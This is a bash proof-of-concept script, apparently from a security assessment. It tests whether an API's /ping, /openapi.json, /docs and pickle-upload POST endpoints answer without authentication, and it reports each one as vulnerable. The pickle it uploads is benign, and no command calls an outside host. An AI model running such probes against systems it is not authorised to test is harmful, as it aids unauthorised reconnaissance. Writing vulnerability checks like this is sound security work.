#!/bin/bash

# POC: Unauthenticated API Access - No Authentication Required for Critical Endpoints
# This script demonstrates that all API endpoints are completely unauthenticated

TARGET_URL="${1:-http://localhost:8080}"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Verify /ping endpoint is accessible without authentication
echo "[TEST 1] Accessing /ping endpoint without authentication..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/ping")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY"

if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: /ping endpoint is accessible without authentication"
else
    echo "✗ FAIL: Expected HTTP 200, got $HTTP_CODE"
    exit 1
fi
echo ""

# Test 2: Verify OpenAPI schema is exposed without authentication
echo "[TEST 2] Accessing /openapi.json without authentication..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/openapi.json")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
echo "Response length: $(echo "$BODY" | wc -c) bytes"
echo "Contains 'openapi': $(echo "$BODY" | grep -c 'openapi')"
echo "Contains '/': $(echo "$BODY" | grep -c '\"\/\"')"

if [ "$HTTP_CODE" = "200" ] && echo "$BODY" | grep -q "openapi"; then
    echo "✓ VULNERABLE: OpenAPI schema is accessible without authentication"
else
    echo "✗ FAIL: Could not access OpenAPI schema"
    exit 1
fi
echo ""

# Test 3: Verify Swagger UI is accessible without authentication
echo "[TEST 3] Accessing /docs without authentication..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/docs")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
echo "Contains 'swagger': $(echo "$BODY" | grep -c -i 'swagger')"

if [ "$HTTP_CODE" = "200" ] && echo "$BODY" | grep -q -i "swagger"; then
    echo "✓ VULNERABLE: Swagger UI is accessible without authentication"
else
    echo "✗ FAIL: Could not access Swagger UI"
    exit 1
fi
echo ""

# Test 4: Verify POST / endpoint accepts file upload without authentication
echo "[TEST 4] Attempting file upload to POST / without authentication..."

# Create a test pickle file
PICKLE_FILE="/tmp/test_pickle_upload.pkl"
python3 << 'PYTHON_EOF' > "$PICKLE_FILE" 2>/dev/null
import pickle
data = {"test": "data"}
with open("/tmp/test_pickle_upload.pkl", "wb") as f:
    pickle.dump(data, f)
PYTHON_EOF

if [ ! -f "$PICKLE_FILE" ]; then
    echo "✗ FAIL: Could not create test pickle file"
    exit 1
fi

# Attempt upload without any authentication
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/" \
    -F "pickle_file=@$PICKLE_FILE")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY"

if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: POST / endpoint accepts file upload without authentication"
else
    echo "✗ FAIL: Expected HTTP 200, got $HTTP_CODE"
    exit 1
fi
echo ""

# Test 5: Verify no 401/403 authentication errors are returned
echo "[TEST 5] Verifying no authentication challenges (401/403) are issued..."
ENDPOINTS=("/ping" "/docs" "/openapi.json")

FOUND_AUTH_ERRORS=0
for endpoint in "${ENDPOINTS[@]}"; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint")
    if [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
        FOUND_AUTH_ERRORS=1
        echo "Found authentication error on $endpoint: $HTTP_CODE"
    fi
done

if [ $FOUND_AUTH_ERRORS -eq 0 ]; then
    echo "✓ VULNERABLE: No authentication errors (401/403) returned"
    echo "  All endpoints are completely unauthenticated"
else
    echo "✗ FAIL: Some endpoints returned authentication errors"
    exit 1
fi
echo ""

echo "[SUMMARY] All tests passed!"
echo "✓ API is completely unauthenticated"
echo "✓ Critical endpoints accessible without credentials"
echo "✓ File upload endpoint processes requests without authentication"
echo "✓ API schema and documentation exposed without authentication"
echo ""
echo "This is a CRITICAL vulnerability - the API has NO authentication mechanism."